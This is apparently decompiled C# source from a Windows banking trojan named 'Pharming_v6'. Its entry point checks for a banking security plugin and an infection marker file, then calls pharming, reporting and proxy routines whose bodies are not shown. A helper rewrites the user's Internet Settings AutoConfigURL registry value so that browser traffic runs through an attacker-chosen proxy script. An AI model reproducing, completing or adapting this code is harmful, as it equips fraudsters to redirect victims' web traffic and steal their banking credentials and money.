using System;
using System.IO;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using Pharming_v6.My;

namespace Pharming_v6;

[StandardModule]
internal sealed class Module1
{
	public static string osName = "UN";

	public static string temp = Path.GetTempPath();

	public static string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	[STAThread]
	public static void Main()
	{
		if (((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles() + "\\GbPlugin") & !((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(temp + "wingbiso.txt"))
		{
			ie.ie();
			pharmantiga.pharmantiga();
			pharmnova.pharmnova();
			so.so();
			enviophp.enviophp();
			criatxtinfect.criatxtinfect();
			atproxy1.atproxy1();
		}
		else
		{
			pharmantiga.pharmantiga();
			pharmnova.pharmnova();
			so.so();
			enviophp.enviophp();
			criatxtinfect.criatxtinfect();
			atproxy1.atproxy1();
		}
	}

	public static object a(string b)
	{
		Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\", writable: true)!.SetValue("AutoConfigURL", b);
		return b;
	}
}
